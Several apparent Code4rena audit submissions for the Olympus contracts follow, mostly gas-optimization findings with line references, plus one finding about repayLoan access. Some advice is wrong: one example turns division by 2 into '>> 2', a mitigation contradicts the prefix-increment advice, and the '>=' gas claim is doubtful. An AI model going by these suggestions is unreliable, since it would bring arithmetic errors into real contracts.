SHIFTING  ``<x> / 2`` is the same as ``<x> >>1``. The ``DIV`` opcode costs 5 gas, whereas ``SHR`` only costs 3 gas  *There are 2 instances of this issue:*  ```  File:  2022-08-olympus/src/policies/Operator.sol  372:   int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);  427:   int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);   ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L372](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L372)   [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L427](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L427)  [8]    MULTIPLE ACCESSES OF A MAPPING/ARRAY SHOULD USE A LOCAL VARIABLE CACHE  The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping’s value in a local ``storage`` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves ~42 gas per access due to not having to recalculate the key’s keccak256 hash (Gkeccak256 - 30 gas) and that calculation’s associated stack operations. Caching an array’s struct avoids recalculating the array offsets into memory  *There are 37 instances of this issue: *  ```  File: 2022-08-olympus/src/modules/TRSRY.sol  69:   withdrawApproval[withdrawer_][token_] = amount_;  143:   uint256 approval = withdrawApproval[withdrawer_][token_];  149:   withdrawApproval[withdrawer_][token_] = approval - amount_;   60: return token_.balanceOf(address(this)) + totalDebt[token_];  97:  totalDebt[token_] += amount_;  116:    totalDebt[token_] -= received;  131:    if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;  132:    else totalDebt[token_] -= oldDebt - amount_;   106:    if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding();  115:     reserveDebt[token_][msg.sender] -= received;  127:      uint256 oldDebt = reserveDebt[token_][debtor_];  129:      reserveDebt[token_][debtor_] = amount_;  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L69](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L69)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L143](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L143)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L149](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L149)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L60](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L60)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L97](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L97)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L116](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L116)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131-L132](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131-L132)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L106](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L106)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L115](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L115)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L127)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L129](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L129)   ```  File: 2022-08-olympus/src/policies/BondCallback.sol  88:   approvedMarkets[teller_][id_] = true;  106:   if (!approvedMarkets[msg.sender][id_]) revert Callback_MarketNotSupported(id_);  143:   _amountsPerMarket[id_][0] += inputAmount_;  144:   _amountsPerMarket[id_][1] += outputAmount_;  179:    uint256[2] memory marketAmounts = _amountsPerMarket[id_];  114:    if (quoteToken.balanceOf(address(this)) < priorBalances[quoteToken] + inputAmount_)  141:    priorBalances[quoteToken] = quoteToken.balanceOf(address(this)); 142:      priorBalances[payoutToken] = payoutToken.balanceOf(address(this));  160:    priorBalances[token] = token.balanceOf(address(this));  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L88](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L88)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L106](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L106)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143-L144](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143-L144)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L179](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L179)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L114](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L114)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L141-L142](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L141-L142)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L160](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L160)   ```  File: 2022-08-olympus/src/policies/Governance.sol   168:   getProposalMetadata[proposalId] = ProposalMetadata(  206:   ProposalMetadata memory proposal = getProposalMetadata[proposalId_];  198:     totalEndorsementsForProposal[proposalId_] += userVotes;  217:    (totalEndorsementsForProposal[proposalId_] * 100) <  193:    uint256 previousEndorsement = userEndorsementsForProposal[proposalId_][msg.sender];  223:      if (proposalHasBeenActivated[proposalId_] == true) {  233:     proposalHasBeenActivated[proposalId_] = true;  252:      yesVotesForProposal[activeProposal.proposalId] += userVotes;  266:       uint256 netVotes = yesVotesForProposal[activeProposal.proposalId] -  254:      noVotesForProposal[activeProposal.proposalId] += userVotes;  267:      noVotesForProposal[activeProposal.proposalId];  247:      if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {  257:       userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes;  296:       uint256 userVotes = userVotesForProposal[proposalId_][msg.sender];  306:       if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {  310:        tokenClaimsForProposal[proposalId_][msg.sender] = true;  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L168](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L168)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L206](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L206)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L217](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L217)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L193](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L193)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L223](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L223)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L233](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L233)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L266](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L266)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L267](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L267)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L247](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L247)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L257](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L257)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L296](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L296)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L306](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L306)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L310](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L310)   [9]  <X> += <Y> COSTS MORE GAS THAN <X> = <X> + <Y> FOR STATE VARIABLES  *There are 6 instances of this issue:*  ``` File: 2022-08-olympus/src/modules/TRSRY.sol  96:  reserveDebt[token_][msg.sender] += amount_;  97:   totalDebt[token_] += amount_;   131:   if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L96-L97](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L96-L97)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131)   ```  File: 2022-08-olympus/src/modules/PRICE.sol   136:   _movingAverage += (currentPrice - earliestPrice) / numObs;  138:     _movingAverage -= (earliestPrice - currentPrice) / numObs;  ```   [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L138](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L138)   ```  File: 2022-08-olympus/src/policies/Heart.sol  103: lastBeat += frequency();  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103)   [10] CHEAPER TO SPLIT STRUCT IF ONLY PART OF IT IS UPDATED FREQUENTLY  The proposalId field is updated frequently so it should be in a separate struct rather than re-writing the whole struct every time  *There is 1 instance of this issue:*   ```   File: 2022-08-olympus/src/policies/Governance.sol  167:  uint256 proposalId = INSTR.store(instructions_);   ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L167](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L167)   [11]  AMOUNTS SHOULD BE CHECKED FOR 0 BEFORE CALLING A TRANSFER  Checking non-zero transfer values can avoid an expensive external call and save gas.  I suggest adding a non-zero-value check here:  *There are 8 instances of this issue:*    ```  File: 2022-08-olympus/src/policies/Heart.sol  111:   function _issueReward(address to_) internal { 112:   rewardToken.safeTransfer(to_, reward); 113:    emit RewardIssued(to_, reward);  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L111-L113](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L111-L113)  ``` File: 2022-08-olympus/src/policies/BondCallback.sol  124:    payoutToken.safeTransfer(msg.sender, outputAmount_);  159:      token.safeTransfer(address(TRSRY), balance);  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L124](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L124)   [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L159](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L159)   ```  File: 2022-08-olympus/src/modules/TRSRY.sol   82:  token_.safeTransfer(to_, amount_);  99:  token_.safeTransfer(msg.sender, amount_);  110:   token_.safeTransferFrom(msg.sender, address(this), amount_);   ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L82](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L82)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L99](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L99)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L110](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L110)                                                                          
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L104-L119   # Vulnerability details  ### TRSRY.sol alows only loan owner to repay loan  It should be allowed that that everyone can repay the loan. There could be a situation that loan owner is not able to repay the loan but a different address could repay in his place. It seems as unnecessary restriction that only the owner can repay his loan.  **Recommendation**: Allow everyone to repay any loan. Context: [`TRSRY.sol#L104-L119`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L104-L119) ```diff= -    function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant { -        if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding();          // Deposit from caller first (to handle nonstandard token transfers)         uint256 prevBalance = token_.balanceOf(address(this));         token_.safeTransferFrom(msg.sender, address(this), amount_);          uint256 received = token_.balanceOf(address(this)) - prevBalance;          // Subtract debt from caller -        reserveDebt[token_][msg.sender] -= received;         totalDebt[token_] -= received;  -        emit DebtRepaid(token_, msg.sender, received);     } ```
## Table of Contents Total of 11 Issues Found. - Storage Variables can be Packed into Fewer Storage Slots - Unchanging State Variable Should be Immutable - Change Function Visibility Public to External - Internal Function Called Only Once can be Inlined - Use Bit Shifting Instead of Multiplication/Division of 2 - Use Calldata instead of Memory for Read Only Function Parameters - Boolean Comparisons - Using Elements Smaller than 32 bytes (256 bits) Might Use More Gas - Unnecessary Default Value Initialization - Store Array's Length as a Variable - ++i Costs Less Gas than i++  &ensp; ### Storage Variables can be Packed into Fewer Storage Slots  #### Issue The order of storage variables can be reordered in a way to reduce the usage amount of storage slots. ``` Reference from solidity documentation: Finally, in order to allow the EVM to optimize for this, ensure that you try to order your storage  variables and struct members such that they can be packed tightly. For example, declaring your  storage variables in the order of uint128, uint128, uint256 instead of uint128, uint256, uint128,  as the former will only take up two slots of storage whereas the latter will take up three. ``` https://docs.soliditylang.org/en/v0.8.15/internals/layout_in_storage.html#layout-of-state-variables-in-storage  #### PoC Total of 1 instance found.  1. OlympusHeart Contract We can save 1 storage slot by reordering it like below. Move bool variable (1 byte size) to pack it with address variable (20 bytes size).  Before: https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L32-L48  Change to: ```solidity     /// @notice Timestamp of the last beat (UTC, in seconds)     uint256 public lastBeat;      /// @notice Reward for beating the Heart (in reward token decimals)     uint256 public reward;      /// @notice Reward token address that users are sent for beating the Heart     ERC20 public rewardToken;      /// @notice Status of the Heart, false = stopped, true = beating     bool public active;      // Modules     OlympusPrice internal PRICE;      // Policies     IOperator internal _operator; ```  #### Mitigation Reorder storage variables like shown in above PoC.  &ensp; ### Unchanging State Variable Should be Immutable  #### Issue State variable that is only set in the constructor and can't be changed afterwards, should be declared as immutable.  #### PoC Total of 2 instances found.  1. ohm variable of BondCallback.sol https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L32  2. aggregator variable of BondCallback.sol https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L28  #### Mitigation Change to immutable.  &ensp; ### Change Function Visibility Public to External  #### Issue If the function is not called internally, it is cheaper to set your function visibility to external instead of public.  #### PoC Total of 4 instances found.  1. Governance.sol:getMetadata() https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L145  2. Governance.sol:getActiveProposal() https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L151  3. Kernel.sol:grantRole() https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L439  4. Kernel.sol:revokeRole() https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L451   #### Mitigation Change the function visibility to external.  &ensp; ### Internal Function Called Only Once Can be Inlined  #### Issue Certain function is defined even though it is called only once. Inline it instead to where it is called to avoid usage of extra gas.  #### PoC Total of 9 instances found.  1. _issueReward() of Heart.sol this function called only once at line 106 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L111-L114 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L106  2. _addObservation() of Operator.sol this function called only once at line 201 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L652-L695 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L201  3. _installModule() of Kernel.sol this function called only once at line 239 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L266-L277 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L239  4. _upgradeModule() of Kernel.sol this function called only once at line 243 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L279-L293 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L243  5. _activatePolicy() of Kernel.sol this function called only once at line 246 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L295-L315 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L246  6. _deactivatePolicy() of Kernel.sol this function called only once at line 249 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L325-L346 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L249  7. _migrateKernel() of Kernel.sol this function called only once at line 256 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L351-L372 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L256  8. _reconfigurePolicies() of Kernel.sol this function called only once at line 292 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L378-L389 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L292  9. _pruneFromDependents() of Kernel.sol this function called only once at line 342 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L409-L432 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L342  #### Mitigation I recommend to not define above functions and instead inline it at place it is called.  &ensp; ### Use Bit Shifting Instead of Multiplication/Division of 2  #### Issue The MUL and DIV opcodes cost 5 gas but SHL and SHR only costs 3 gas. Since MUL/DIV and SHL/SHR result the same, use cheaper bit shifting.  #### PoC Total of 5 instances found. ```solidity ./Operator.sol:372:            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2); ./Operator.sol:427:            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2); ./Operator.sol:419:            uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price; ./Operator.sol:420:            uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price; ./Operator.sol:786:                ) * (FACTOR_SCALE + RANGE.spread(true) * 2)) / ```  #### Mitigation Use bit shifting instead of multiplication/division. Example: ```solidity uint256 center = upper - (upper - lower) / 2;  Good: uint256 center = upper - (upper - lower) >> 2;  ```  &ensp; ### Use Calldata instead of Memory for Read Only Function Parameters  #### Issue It is cheaper gas to use calldata than memory if the function parameter is read only. Calldata is a non-modifiable, non-persistent area where function arguments are stored,  and behaves mostly like memory. More details on following link. link: https://docs.soliditylang.org/en/v0.8.15/types.html#data-location  #### PoC Total of 4 instances found. ``` ./Governance.sol:162:        string memory proposalURI_ ./PRICE.sol:205:    function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_) ./TreasuryCustodian.sol:53:    function revokePolicyApprovals(address policy_, ERC20[] memory tokens_) external { ./BondCallback.sol:152:    function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") { ```  #### Mitigation Change memory to calldata  &ensp; ### Boolean Comparisons  #### Issue It is more gas expensive to compare boolean with "variable == true" or "variable == false" than  directly checking the returned boolean value.  #### PoC Total of 2 instances found.  ``` ./Governance.sol:223:        if (proposalHasBeenActivated[proposalId_] == true) { ./Governance.sol:306:        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) { ```  #### Mitigation Simply check by returned boolean value. Change it to ``` if (proposalHasBeenActivated[proposalId_]) ```  &ensp; ### Using Elements Smaller than 32 bytes (256 bits) Might Use More Gas  #### Issue Since EVM operates on 32 bytes at a time, if the element is smaller than that, the EVM must use more operations in order to reduce the elements from 32 bytes to specified size.  Reference: https://docs.soliditylang.org/en/v0.8.15/internals/layout_in_storage.html  #### PoC Total of 42 instances found. ``` ./PriceConfig.sol:58:    function changeMovingAverageDuration(uint48 movingAverageDuration_) ./PriceConfig.sol:69:    function changeObservationFrequency(uint48 observationFrequency_) ./IOperator.sol:85:    function setCushionFactor(uint32 cushionFactor_) external; ./IOperator.sol:93:        uint32 duration_, ./IOperator.sol:94:        uint32 debtBuffer_, ./IOperator.sol:95:        uint32 depositInterval_ ./IOperator.sol:101:    function setReserveFactor(uint32 reserveFactor_) external; ./IOperator.sol:110:        uint32 wait_, ./IOperator.sol:111:        uint32 threshold_, ./IOperator.sol:112:        uint32 observe_ ./TRSRY.sol:51:    function VERSION() external pure override returns (uint8 major, uint8 minor) { ./VOTES.sol:27:    function VERSION() external pure override returns (uint8 major, uint8 minor) { ./MINTR.sol:25:    function VERSION() external pure override returns (uint8 major, uint8 minor) { ./PRICE.sol:27:    event MovingAverageDurationChanged(uint48 movingAverageDuration_); ./PRICE.sol:28:    event ObservationFrequencyChanged(uint48 observationFrequency_); ./PRICE.sol:75:        uint48 observationFrequency_, ./PRICE.sol:76:        uint48 movingAverageDuration_ ./PRICE.sol:84:        uint8 ohmEthDecimals = _ohmEthPriceFeed.decimals(); ./PRICE.sol:87:        uint8 reserveEthDecimals = _reserveEthPriceFeed.decimals(); ./PRICE.sol:113:    function VERSION() external pure override returns (uint8 major, uint8 minor) { ./PRICE.sol:127:        uint32 numObs = numObservations; ./PRICE.sol:185:        uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1; ./PRICE.sol:240:    function changeMovingAverageDuration(uint48 movingAverageDuration_) external permissioned { ./PRICE.sol:266:    function changeObservationFrequency(uint48 observationFrequency_) external permissioned { ./Operator.sol:51:    event CushionFactorChanged(uint32 cushionFactor_); ./Operator.sol:52:    event CushionParamsChanged(uint32 duration_, uint32 debtBuffer_, uint32 depositInterval_); ./Operator.sol:53:    event ReserveFactorChanged(uint32 reserveFactor_); ./Operator.sol:54:    event RegenParamsChanged(uint32 wait_, uint32 threshold_, uint32 observe_); ./Operator.sol:97:        uint32[8] memory configParams // [cushionFactor, cushionDuration, cushionDebtBuffer, cushionDepositInterval, reserveFactor, regenWait, regenThreshold, regenObserve] ./Operator.sol:418:            uint8 oracleDecimals = PRICE.decimals(); ./Operator.sol:516:    function setCushionFactor(uint32 cushionFactor_) external onlyRole("operator_policy") { ./Operator.sol:528:        uint32 duration_, ./Operator.sol:529:        uint32 debtBuffer_, ./Operator.sol:530:        uint32 depositInterval_ ./Operator.sol:548:    function setReserveFactor(uint32 reserveFactor_) external onlyRole("operator_policy") { ./Operator.sol:560:        uint32 wait_, ./Operator.sol:561:        uint32 threshold_, ./Operator.sol:562:        uint32 observe_ ./Operator.sol:665:        uint32 observe = _config.regenObserve; ./INSTR.sol:28:    function VERSION() public pure override returns (uint8 major, uint8 minor) { ./Kernel.sol:100:    function VERSION() external pure virtual returns (uint8 major, uint8 minor) {} ./RANGE.sol:115:    function VERSION() external pure override returns (uint8 major, uint8 minor) { ```  #### Mitigation I suggest using uint256 instead of anything smaller or downcast where needed.  &ensp; ### Unnecessary Default Value Initialization  #### Issue When variable is not initialized, it will have its default values. For example, 0 for uint, false for bool and address(0) for address. Reference: https://docs.soliditylang.org/en/v0.8.15/control-structures.html#scoping-and-declarations  #### PoC Total of 3 instances found. ``` ./KernelUtils.sol:43:    for (uint256 i = 0; i < 5; ) { ./KernelUtils.sol:58:    for (uint256 i = 0; i < 32; ) { ./Kernel.sol:397:        for (uint256 i = 0; i < reqLength; ) { ```  #### Mitigation I suggest removing default value initialization. For example, - for (uint256 i; i < 5; ) {  &ensp; ### Store Array's Length as a Variable   #### Issue By storing an array's length as a variable before the for-loop, can save 3 gas per iteration.  #### PoC Total of 1 instance found. ``` ./Governance.sol:278:        for (uint256 step; step < instructions.length; ) { ```  #### Mitigation Store array's length as a variable before looping it. For example, I suggest changing it to ``` uint256 length = instructions.length; for (uint256 step; step < length; ) { ```  &ensp; ### ++i Costs Less Gas than i++  #### Issue Prefix increments/decrements (++i or --i) costs cheaper gas than  postfix increment/decrements (i++ or i--).  #### PoC Total of 7 instances found. ``` ./KernelUtils.sol:49:            i++; ./KernelUtils.sol:64:            i++; ./Operator.sol:488:            decimals++; ./Operator.sol:670:                _status.low.count++; ./Operator.sol:686:                _status.high.count++; ./Operator.sol:675:                _status.low.count--; ./Operator.sol:691:                _status.high.count--; ```  #### Mitigation Change it to postfix increments/decrements. It saves 6 gas per loop.  &ensp;
 # PREFIX INCREMENTS   IMPACT   Prefix increments are cheaper than postfix increments.    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/utils/KernelUtils.sol#L49    i++;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/utils/KernelUtils.sol#L64    i++;   Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L488    decimals++;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L670    _status.low.count++;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L686    _status.high.count++;  Mitigation:   replace foo++ to ++foo    # DEFAULT VALUE INITIALIZATION   IMPACT    If a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). Explicitly initializing it with its default value is an anti-pattern and wastes gas.     Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/Kernel.sol#L397    for (uint256 i = 0; i < reqLength; ) {   Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/utils/KernelUtils.sol#L43    for (uint256 i = 0; i < 5; ) {        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/utils/KernelUtils.sol#L58    for (uint256 i = 0; i < 32; ) {        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L574    _status.high.count = 0;        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L575    _status.high.nextObservation = 0;        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L578    _status.low.count = 0;        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L579    _status.low.nextObservation = 0;   Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/PRICE.sol#L254    _movingAverage = 0;   Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/PRICE.sol#L286    _movingAverage = 0;        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/RANGE.sol#L135    _range.high.active = false;        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/RANGE.sol#L147    _range.low.active = false;        Mitigation:   Remove explicit value initialization.     # COMPARISON OPERATORS   IMPACT    In the EVM, there is no opcode for >= or <=. When using greater than or equal, two operations are performed: > and =.    Using strict comparison operators hence saves gas.        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L210    uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L211    _status.high.count >= config_.regenThreshold    Instance: 